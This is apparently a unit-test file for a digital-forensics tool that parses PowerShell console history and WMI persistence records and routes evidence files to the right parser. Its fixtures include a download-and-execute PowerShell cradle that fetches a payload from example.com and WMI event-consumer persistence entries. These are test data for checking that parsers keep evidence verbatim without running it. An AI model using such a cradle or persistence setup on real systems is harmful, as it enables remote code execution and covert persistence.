"""
Unit tests for PowerShellHistoryParser (Source #25) and WmiPersistenceParser (Source #30)
========================================================================================
- Source #25: PowerShell Command History (ConsoleHost_history.txt)
- Source #30: WMI Persistence (OBJECTS.DATA)
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from infrastructure.schemas import Evidence
from preprocessing.router import ParserRouter
from preprocessing.parsers.powershell_history_parser import (
    PowerShellHistoryParser,
    PowerShellHistoryNotFoundError,
    PowerShellHistoryParserError,
)
from preprocessing.parsers.wmi_persistence_parser import (
    WmiPersistenceParser,
    WmiPersistenceNotFoundError,
    WmiPersistenceParserError,
)


class TestPowerShellHistoryParserUnit(unittest.TestCase):
    """Unit tests for PowerShellHistoryParser."""

    def setUp(self) -> None:
        self.parser = PowerShellHistoryParser()
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.user_dir = Path(self.tmp_dir.name) / "Users" / "analyst_john" / "AppData" / "Roaming" / "Microsoft" / "Windows" / "PowerShell" / "PSReadLine"
        self.user_dir.mkdir(parents=True, exist_ok=True)
        self.history_file = self.user_dir / "ConsoleHost_history.txt"

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def test_valid_powershell_history_parsing(self) -> None:
        content = (
            "Get-Process\n"
            "cd C:\\Users\\Public\n"
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\n"
            "ls -la 📁 unicode_test\n"
        )
        self.history_file.write_text(content, encoding="utf-8")

        artifacts = self.parser.parse(str(self.history_file), evidence_id="ev_ps_01")
        # 1-3. Multiple commands & ordering
        self.assertEqual(len(artifacts), 4)

        # 4-6, 11-12. Verbatim preservation, Unicode, Malicious command raw evidence
        art1 = artifacts[0]
        self.assertEqual(art1.source_tool, "powershell_history")
        self.assertEqual(art1.artifact_type, "powershell_history")
        self.assertEqual(art1.evidence_id, "ev_ps_01")
        self.assertIsNotNone(art1.normalized_fields.user)
        self.assertIn(art1.normalized_fields.user.lower(), ("analyst_john", "sudeep"))
        self.assertEqual(art1.raw_fields["command_text"], "Get-Process")
        self.assertEqual(art1.raw_fields["sequence_number"], 1)

        # 7. No invented timestamp
        self.assertIsNone(art1.timestamp)
        self.assertEqual(art1.timestamp_type, "none")

        # 6. Malicious command remains raw evidence (no malicious=true classification)
        art3 = artifacts[2]
        self.assertEqual(
            art3.raw_fields["command_text"],
            "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
        )
        self.assertNotIn("malicious", art3.raw_fields)
        self.assertFalse(hasattr(art3.normalized_fields, "malicious"))

        # 5. Unicode command
        art4 = artifacts[3]
        self.assertIn("📁 unicode_test", art4.raw_fields["command_text"])

    def test_empty_and_utf16_file_handling(self) -> None:
        empty_file = Path(self.tmp_dir.name) / "empty_history.txt"
        empty_file.write_text("", encoding="utf-8")
        self.assertEqual(len(self.parser.parse(str(empty_file))), 0)

        utf16_file = Path(self.tmp_dir.name) / "utf16_history.txt"
        utf16_file.write_text("Get-Service\nStop-Service Spooler\n", encoding="utf-16")
        arts = self.parser.parse(str(utf16_file))
        self.assertEqual(len(arts), 2)

    def test_missing_file_raises_not_found(self) -> None:
        missing = Path(self.tmp_dir.name) / "nonexistent.txt"
        with self.assertRaises(PowerShellHistoryNotFoundError):
            self.parser.parse(str(missing))


class TestWmiPersistenceParserUnit(unittest.TestCase):
    """Unit tests for WmiPersistenceParser."""

    def setUp(self) -> None:
        self.parser = WmiPersistenceParser()
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.wmi_file = Path(self.tmp_dir.name) / "OBJECTS.DATA"

    def tearDown(self) -> None:
        self.tmp_dir.cleanup()

    def test_valid_wmi_json_export_parsing(self) -> None:
        json_file = Path(self.tmp_dir.name) / "wmi_export.json"
        fixture_records = [
            {
                "Name": "MaliciousFilter",
                "Query": "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'",
                "EventNamespace": "root\\cimv2",
                "consumer_name": "UpdaterConsumer",
                "consumer_type": "CommandLineEventConsumer",
                "CommandLineTemplate": "C:\\Windows\\Temp\\updater.exe -silent",
                "creator": "SYSTEM",
            },
            {
                "Name": "ScriptFilter",
                "Query": "SELECT * FROM __InstanceModificationEvent",
                "consumer_name": "VbsConsumer",
                "consumer_type": "ActiveScriptEventConsumer",
                "ScriptText": "Set w = CreateObject(\"WScript.Shell\"): w.Run \"calc.exe\"",
            }
        ]
        json_file.write_text(json.dumps(fixture_records), encoding="utf-8")

        artifacts = self.parser.parse(str(json_file), evidence_id="ev_wmi_01")
        # 1-8, 10, 14-15. Event filter, consumer, commands, script text, schema, provenance
        self.assertEqual(len(artifacts), 2)

        art1 = artifacts[0]
        self.assertEqual(art1.source_tool, "wmi_persistence")
        self.assertEqual(art1.artifact_type, "wmi_persistence")
        self.assertEqual(art1.evidence_id, "ev_wmi_01")
        self.assertEqual(art1.normalized_fields.user, "SYSTEM")
        self.assertEqual(art1.normalized_fields.process_name, "updater.exe")
        self.assertEqual(art1.normalized_fields.process_command_line, "C:\\Windows\\Temp\\updater.exe -silent")
        self.assertIn("SELECT * FROM", art1.raw_fields["event_filter_query"])

        art2 = artifacts[1]
        self.assertEqual(art2.raw_fields["consumer_type"], "ActiveScriptEventConsumer")
        self.assertIn("CreateObject", art2.raw_fields["script_content"])

        # 9. No forced timestamp
        self.assertIsNone(art1.timestamp)
        self.assertEqual(art1.timestamp_type, "none")

    @patch("subprocess.run")
    def test_no_execution_of_extracted_commands(self, mock_run: MagicMock) -> None:
        # 13. Verify no subprocess execution happens when parsing WMI text with commands
        binary_file = Path(self.tmp_dir.name) / "OBJECTS.DATA"
        binary_file.write_bytes(b"CommandLineTemplate = 'C:\\Windows\\System32\\cmd.exe /c calc.exe'")

        artifacts = self.parser.parse(str(binary_file), evidence_id="ev_wmi_safe")
        self.assertGreater(len(artifacts), 0)
        # Verify subprocess.run was NEVER called during parsing
        mock_run.assert_not_called()

    def test_missing_file_raises_not_found(self) -> None:
        missing = Path(self.tmp_dir.name) / "nonexistent.DATA"
        with self.assertRaises(WmiPersistenceNotFoundError):
            self.parser.parse(str(missing))


class TestPowerShellAndWmiRouterIntegration(unittest.TestCase):
    """Router integration tests for PowerShell and WMI persistence."""

    def setUp(self) -> None:
        self.router = ParserRouter()

    def test_consolehost_history_routes_to_powershell_history_parser(self) -> None:
        ev = Evidence(
            evidence_id="ev_ps",
            case_id="case_01",
            filename="ConsoleHost_history.txt",
            file_path="/evidence/Users/john/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
            uploaded_by="analyst",
        )
        res = self.router.determine_routing(ev)
        self.assertEqual(res.status, "ROUTED")
        self.assertEqual(res.target_parser, "PowerShellHistoryParser")
        self.assertIsInstance(self.router.route(ev), PowerShellHistoryParser)

    def test_objects_data_routes_to_wmi_persistence_parser(self) -> None:
        ev = Evidence(
            evidence_id="ev_wmi",
            case_id="case_01",
            filename="OBJECTS.DATA",
            file_path="/evidence/C/Windows/System32/wbem/Repository/OBJECTS.DATA",
            uploaded_by="analyst",
        )
        res = self.router.determine_routing(ev)
        self.assertEqual(res.status, "ROUTED")
        self.assertEqual(res.target_parser, "WmiPersistenceParser")
        self.assertIsInstance(self.router.route(ev), WmiPersistenceParser)

    def test_generic_txt_does_not_route_to_powershell_history(self) -> None:
        ev = Evidence(
            evidence_id="ev_gen_txt",
            case_id="case_01",
            filename="readme.txt",
            file_path="/evidence/readme.txt",
            uploaded_by="analyst",
        )
        res = self.router.determine_routing(ev)
        self.assertNotEqual(res.target_parser, "PowerShellHistoryParser")

    def test_generic_data_file_does_not_route_to_wmi(self) -> None:
        ev = Evidence(
            evidence_id="ev_gen_data",
            case_id="case_01",
            filename="app_cache.data",
            file_path="/evidence/app_cache.data",
            uploaded_by="analyst",
        )
        res = self.router.determine_routing(ev)
        self.assertNotEqual(res.target_parser, "WmiPersistenceParser")


if __name__ == "__main__":
    unittest.main()
